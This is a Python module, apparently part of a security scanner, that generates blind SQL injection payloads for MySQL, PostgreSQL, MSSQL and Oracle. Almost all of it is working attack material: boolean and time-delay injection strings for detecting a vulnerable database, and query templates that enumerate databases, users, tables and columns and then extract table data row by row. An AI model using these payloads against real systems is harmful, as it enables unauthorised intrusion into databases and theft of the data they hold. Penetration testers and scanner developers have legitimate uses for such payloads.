"""
===========================================================
Project : Sentinel AI
Module  : Blind SQL Injection Payloads
File ID : SCANNER-BLIND-PAYLOADS-001
Version : 1.0.0
===========================================================

Description:
Generates DBMS-specific payloads for Blind SQL Injection.
Supports Boolean-Based and Time-Based techniques.
"""

from __future__ import annotations


class BlindPayloadGenerator:
    """
    Generates DBMS-specific payloads for Blind SQL Injection.
    """

    # ============================================================
    # DBMS Detection Payloads
    # ============================================================

    DBMS_DETECTION = {
        "MySQL": {
            "boolean": [
                ("' AND 1=1-- -", "' AND 1=2-- -"),
                ("' AND '1'='1", "' AND '1'='2"),
                ("' OR 1=1#", "' OR 1=2#"),
            ],
            "time": [
                "' AND SLEEP(5)-- -",
                "' OR SLEEP(5)#",
            ],
        },
        "PostgreSQL": {
            "boolean": [
                ("' AND 1=1--", "' AND 1=2--"),
                ("' AND '1'='1'--", "' AND '1'='2'--"),
            ],
            "time": [
                "'; SELECT pg_sleep(5)--",
                "' OR pg_sleep(5)--",
            ],
        },
        "MSSQL": {
            "boolean": [
                ("' AND 1=1--", "' AND 1=2--"),
                ("' AND '1'='1'--", "' AND '1'='2'--"),
            ],
            "time": [
                "'; WAITFOR DELAY '0:0:5'--",
                "' OR WAITFOR DELAY '0:0:5'--",
            ],
        },
        "Oracle": {
            "boolean": [
                ("' AND 1=1--", "' AND 1=2--"),
                ("' AND '1'='1'--", "' AND '1'='2'--"),
            ],
            "time": [
                "' AND DBMS_PIPE.RECEIVE_MESSAGE('A',5)--",
            ],
        },
    }

    # ============================================================
    # Boolean-Based Extraction Payloads
    # ============================================================

    BOOLEAN_EXTRACTION = {
        "MySQL": {
            "database": "SELECT database()",
            "version": "SELECT version()",
            "user": "SELECT user()",
            "table_count": "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()",
            "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET {}",
            "column_count": "SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'",
            "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT 1 OFFSET {}",
            "data": "SELECT {} FROM {} LIMIT 1 OFFSET {}",
        },
        "PostgreSQL": {
            "database": "SELECT current_database()",
            "version": "SELECT version()",
            "user": "SELECT current_user",
            "table_count": "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=current_database()",
            "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema=current_database() LIMIT 1 OFFSET {}",
            "column_count": "SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'",
            "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT 1 OFFSET {}",
            "data": "SELECT {} FROM {} LIMIT 1 OFFSET {}",
        },
        "MSSQL": {
            "database": "SELECT DB_NAME()",
            "version": "SELECT @@VERSION",
            "user": "SELECT SYSTEM_USER",
            "table_count": "SELECT COUNT(*) FROM information_schema.tables",
            "tables": "SELECT table_name FROM information_schema.tables ORDER BY table_name OFFSET {} ROWS FETCH NEXT 1 ROWS ONLY",
            "column_count": "SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'",
            "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{}' ORDER BY column_name OFFSET {} ROWS FETCH NEXT 1 ROWS ONLY",
            "data": "SELECT {} FROM {} ORDER BY 1 OFFSET {} ROWS FETCH NEXT 1 ROWS ONLY",
        },
        "Oracle": {
            "database": "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL",
            "version": "SELECT BANNER FROM V$VERSION WHERE ROWNUM=1",
            "user": "SELECT USER FROM DUAL",
            "table_count": "SELECT COUNT(*) FROM USER_TABLES",
            "tables": "SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM=1 AND TABLE_NAME NOT IN (SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM<={})",
            "column_count": "SELECT COUNT(*) FROM USER_TAB_COLUMNS WHERE TABLE_NAME='{}'",
            "columns": "SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE TABLE_NAME='{}' AND ROWNUM=1 AND COLUMN_NAME NOT IN (SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE TABLE_NAME='{}' AND ROWNUM<={})",
            "data": "SELECT {} FROM {} WHERE ROWNUM=1 AND {} NOT IN (SELECT {} FROM {} WHERE ROWNUM<={})",
        },
    }

    # ============================================================
    # Time-Based Extraction Payloads
    # ============================================================

    TIME_EXTRACTION = {
        "MySQL": {
            "database": "SELECT database()",
            "version": "SELECT version()",
            "user": "SELECT user()",
            "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET {}",
            "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT 1 OFFSET {}",
            "data": "SELECT {} FROM {} LIMIT 1 OFFSET {}",
        },
        "PostgreSQL": {
            "database": "SELECT current_database()",
            "version": "SELECT version()",
            "user": "SELECT current_user",
            "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema=current_database() LIMIT 1 OFFSET {}",
            "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT 1 OFFSET {}",
            "data": "SELECT {} FROM {} LIMIT 1 OFFSET {}",
        },
        "MSSQL": {
            "database": "SELECT DB_NAME()",
            "version": "SELECT @@VERSION",
            "user": "SELECT SYSTEM_USER",
            "tables": "SELECT table_name FROM information_schema.tables ORDER BY table_name OFFSET {} ROWS FETCH NEXT 1 ROWS ONLY",
            "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{}' ORDER BY column_name OFFSET {} ROWS FETCH NEXT 1 ROWS ONLY",
            "data": "SELECT {} FROM {} ORDER BY 1 OFFSET {} ROWS FETCH NEXT 1 ROWS ONLY",
        },
        "Oracle": {
            "database": "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL",
            "version": "SELECT BANNER FROM V$VERSION WHERE ROWNUM=1",
            "user": "SELECT USER FROM DUAL",
            "tables": "SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM=1 AND TABLE_NAME NOT IN (SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM<={})",
            "columns": "SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE TABLE_NAME='{}' AND ROWNUM=1 AND COLUMN_NAME NOT IN (SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE TABLE_NAME='{}' AND ROWNUM<={})",
            "data": "SELECT {} FROM {} WHERE ROWNUM=1 AND {} NOT IN (SELECT {} FROM {} WHERE ROWNUM<={})",
        },
    }

    def __init__(self, dbms: str = "MySQL"):
        self.dbms = dbms
        self._detection_payloads = self.DBMS_DETECTION.get(
            dbms, self.DBMS_DETECTION["MySQL"]
        )
        self._boolean_payloads = self.BOOLEAN_EXTRACTION.get(
            dbms, self.BOOLEAN_EXTRACTION["MySQL"]
        )
        self._time_payloads = self.TIME_EXTRACTION.get(
            dbms, self.TIME_EXTRACTION["MySQL"]
        )

    def get_boolean_detection_pairs(self) -> list[tuple[str, str]]:
        """Get boolean detection payload pairs."""
        return self._detection_payloads.get("boolean", [])

    def get_time_detection_payloads(self) -> list[str]:
        """Get time detection payloads."""
        return self._detection_payloads.get("time", [])

    def get_boolean_database_query(self) -> str:
        """Get boolean database name query."""
        return self._boolean_payloads.get("database", "SELECT database()")

    def get_boolean_version_query(self) -> str:
        """Get boolean version query."""
        return self._boolean_payloads.get("version", "SELECT version()")

    def get_boolean_user_query(self) -> str:
        """Get boolean user query."""
        return self._boolean_payloads.get("user", "SELECT user()")

    def get_boolean_table_count_query(self) -> str:
        """Get boolean table count query."""
        return self._boolean_payloads.get(
            "table_count", "SELECT COUNT(*) FROM information_schema.tables"
        )

    def get_boolean_tables_query(self, offset: int) -> str:
        """Get boolean tables query with offset."""
        return self._boolean_payloads.get(
            "tables",
            "SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {}",
        ).format(offset)

    def get_boolean_column_count_query(self, table: str) -> str:
        """Get boolean column count query."""
        return self._boolean_payloads.get(
            "column_count",
            "SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'",
        ).format(table)

    def get_boolean_columns_query(self, table: str, offset: int) -> str:
        """Get boolean columns query with offset."""
        return self._boolean_payloads.get(
            "columns",
            "SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT 1 OFFSET {}",
        ).format(table, offset)

    def get_boolean_data_query(self, column: str, table: str, offset: int) -> str:
        """Get boolean data query with offset."""
        return self._boolean_payloads.get(
            "data", "SELECT {} FROM {} LIMIT 1 OFFSET {}"
        ).format(column, table, offset)

    def get_time_database_query(self) -> str:
        """Get time database name query."""
        return self._time_payloads.get("database", "SELECT database()")

    def get_time_version_query(self) -> str:
        """Get time version query."""
        return self._time_payloads.get("version", "SELECT version()")

    def get_time_user_query(self) -> str:
        """Get time user query."""
        return self._time_payloads.get("user", "SELECT user()")

    def get_time_tables_query(self, offset: int) -> str:
        """Get time tables query with offset."""
        return self._time_payloads.get(
            "tables",
            "SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {}",
        ).format(offset)

    def get_time_columns_query(self, table: str, offset: int) -> str:
        """Get time columns query with offset."""
        return self._time_payloads.get(
            "columns",
            "SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT 1 OFFSET {}",
        ).format(table, offset)

    def get_time_data_query(self, column: str, table: str, offset: int) -> str:
        """Get time data query with offset."""
        return self._time_payloads.get(
            "data", "SELECT {} FROM {} LIMIT 1 OFFSET {}"
        ).format(column, table, offset)


def create_blind_payload_generator(dbms: str = "MySQL") -> BlindPayloadGenerator:
    """Factory function for BlindPayloadGenerator."""
    return BlindPayloadGenerator(dbms)
